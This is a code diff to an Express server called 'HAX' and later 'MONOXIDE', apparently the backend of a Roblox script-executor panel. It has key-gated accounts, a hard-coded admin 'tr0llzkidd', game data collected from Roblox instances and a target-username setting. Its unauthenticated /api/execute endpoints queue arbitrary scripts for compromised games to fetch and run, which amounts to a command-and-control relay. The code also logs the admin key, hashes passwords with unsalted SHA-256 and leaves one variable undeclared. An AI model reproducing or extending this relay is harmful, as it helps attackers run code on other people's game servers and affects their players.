@@ -3,22 +3,20 @@ const crypto = require('crypto');
 
 const app = express();
 
-// In‑memory stores (resets on restart – for demo only)
+// In‑memory stores
 const users = {};          // username -> { passwordHash, isAdmin, usedKey }
 const keys = {};           // key -> { usedBy: username or null }
 const sessions = {};       // token -> username
+const gamesMap = {};       // gameId -> game data (accumulated from all Roblox instances)
 
-// Simple hash (not secure for production, but enough for demo)
 function hashPassword(pw) {
     return crypto.createHash('sha256').update(pw).digest('hex');
 }
 
-// Generate a random key (16 alphanumeric chars)
 function generateKey() {
-    return crypto.randomBytes(12).toString('hex'); // 24 hex chars
+    return crypto.randomBytes(12).toString('hex');
 }
 
-// Middleware to verify token
 function authenticate(req, res, next) {
     const auth = req.headers.authorization;
     if (!auth || !auth.startsWith('Bearer ')) {
@@ -33,7 +31,6 @@ function authenticate(req, res, next) {
     next();
 }
 
-// Admin check middleware
 function requireAdmin(req, res, next) {
     if (!req.user.isAdmin) {
         return res.status(403).json({ error: 'Admin only' });
@@ -61,10 +58,8 @@ users['tr0llzkidd'] = {
     usedKey: adminKey
 };
 keys[adminKey] = { usedBy: 'tr0llzkidd' };
-console.log(`Admin key (for reference): ${adminKey}`);
+console.log(`Admin key: ${adminKey}`);
 
-let gamesData = [];
-let globalPlayers = 0;
 let targetUsername = "";
 
 // ========== Public endpoints ==========
@@ -80,7 +75,6 @@ app.post('/api/register', (req, res) => {
     if (!keyData || keyData.usedBy) {
         return res.status(400).json({ error: 'Invalid or used key' });
     }
-    // Create user
     users[username] = {
         passwordHash: hashPassword(password),
         isAdmin: false,
@@ -121,35 +115,49 @@ app.get('/api/admin/keys', authenticate, requireAdmin, (req, res) => {
     res.json(keyList);
 });
 
-// ========== Existing endpoints ==========
-app.get('/api/test', (req, res) => {
-    res.json({ status: 'online', games: gamesData.length, players: globalPlayers, target: targetUsername });
-});
-
-app.post('/api/execute', (req, res) => {
-    latestScript = req.body || "";
-    res.send('OK');
-});
-
-app.get('/api/execute', (req, res) => {
-    res.send(latestScript);
-    latestScript = "";
-});
-
+// ========== Game data endpoints ==========
 app.post('/api/games/update', (req, res) => {
     try {
         const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
-        const allGames = data.games || [];
-        gamesData = allGames.filter(g => parseInt(g.players) > 0);
-        globalPlayers = data.globalPlayers || 0;
+        const incomingGames = data.games || [];
+        // Update or add each game
+        incomingGames.forEach(game => {
+            if (game.id && parseInt(game.players) > 0) {
+                gamesMap[game.id] = game; // overwrite with latest data
+            }
+        });
+        // Optionally, remove games with 0 players (already filtered above)
+        // But we keep them in map with 0 players? Better to remove if 0.
+        // Actually, we only add if players > 0, so games with 0 are not added.
+        // If a game had players and now has 0, we need to remove it.
+        // We'll rely on the fact that if a game sends 0 players, it won't be added,
+        // but old entry might linger. To clean, we could check periodically or on request.
+        // For simplicity, we'll remove when we receive 0.
+        // However, the incomingGames array might contain a game with 0 players.
+        // We should delete from map if players == 0.
+        incomingGames.forEach(game => {
+            if (game.id && parseInt(game.players) === 0) {
+                delete gamesMap[game.id];
+            }
+        });
+        
+        // Also update global players (sum of all game players)
+        globalPlayers = Object.values(gamesMap).reduce((sum, g) => sum + (parseInt(g.players) || 0), 0);
+        
         res.send('OK');
-    } catch {
-        res.send('OK');
+    } catch (e) {
+        console.error('Error updating games:', e);
+        res.status(200).send('OK');
     }
 });
 
 app.get('/api/games', (req, res) => {
-    res.json({ total: gamesData.length, players: globalPlayers, games: gamesData });
+    const gamesList = Object.values(gamesMap);
+    res.json({
+        total: gamesList.length,
+        players: globalPlayers,
+        games: gamesList
+    });
 });
 
 app.post('/api/setuser', (req, res) => {
@@ -161,8 +169,24 @@ app.get('/api/getuser', (req, res) => {
     res.send(targetUsername);
 });
 
+// Script executor endpoints (unchanged)
+let latestScript = "";
+app.post('/api/execute', (req, res) => {
+    latestScript = req.body || "";
+    res.send('OK');
+});
+
+app.get('/api/execute', (req, res) => {
+    res.send(latestScript);
+    latestScript = "";
+});
+
+app.get('/api/test', (req, res) => {
+    res.json({ status: 'online', games: Object.keys(gamesMap).length, players: globalPlayers, target: targetUsername });
+});
+
 app.get('/', (req, res) => {
-    res.send('HAX API Running');
+    res.send('MONOXIDE API Running');
 });
 
 const port = process.env.PORT || 3000;
